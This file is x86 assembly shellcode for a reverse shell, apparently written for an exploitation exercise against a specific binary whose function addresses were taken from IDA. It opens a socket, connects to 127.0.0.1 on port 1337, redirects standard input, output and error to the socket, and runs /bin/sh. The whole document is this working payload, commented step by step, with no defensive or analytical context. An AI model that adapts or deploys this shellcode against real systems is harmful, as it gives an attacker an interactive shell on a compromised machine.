sub esp, 250                                # make place

socket:
    # socket(AF_INET, SOCK_STREAM, 0);
    push 0                                  # int protocol = 0
	push 1                                  # int type = SOCK_STREAM
	push 2                                  # int domain = AF_INET
    mov eax, 0x08048730                     # socket address (from IDA)
    call eax                                # socket call
    
    # sockfd = socket(...);
    mov ebx, eax                            # ebx = socket(...) ret-val

    
connect:
    # struct sockaddr_in s_address; 
    # socklen_t addrsize = sizeof(struct sockaddr_in );
    # memset(&s_address, 0, addrsize);
    # s_address.sin_family = AF_INET;
    # s_address.sin_port = htons(1337); 
    # inet_pton(AF_INET, "127.0.0.1", &s_address.sin_addr);
    # connfd = connect(sockfd, (struct sockaddr*) &s_address, addrsize); 
    
    push dword ptr 0x0100007f               # ip, a 32-bit unsigned integer = "127.0.0.1" (little-endian hex format)
    push word ptr 0x3905                    # port, a 16-bit unsigned integer = 1337
    push word ptr 2                         # domain = AF_INET (2)
    mov ecx, esp                            # pointer to s_address
    push byte ptr 0x10                      # s_server size
    push ecx                                # pointer to s_address
    push ebx                                # sockfd
    mov eax, 0x08048750                     # connect address (from IDA)
    call eax                                # connect call


mov ecx, 0                                # ecx = 0
dup2:
    # dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
    push ecx                                # dup2 arg2: STDIN/STDOUT/STDERR
    push ebx                                # dup2 arg1: sockfd
    mov eax, 0x08048600                     # dup2 address (from IDA)
    call eax                                # dup2 call
    cmp ecx,2                               
    jne increment                           # loop for 0,1,2
    jmp after_loop
    
increment:
    inc ecx
    jmp dup2 
    

after_loop:


jmp string
execv:
    # execv("/bin/sh", NULL);
    pop ebx                                 # pointer to "/bin/sh"
    push 0                                  # 2nd parameter for exec
    push ebx                                # 1st parameter for exec
    mov eax, 0x080486d0                     # execv address (from IDA)
    call eax                                # execv call    
string:
    call execv                              # push the string address as RA
    .STRING "/bin/sh"


exit:
    # exit(0)
    push 0                                  # exit arg1: 0
    mov eax, 0x080486a0                     # exit address (from IDA)
    call eax                                # exit call
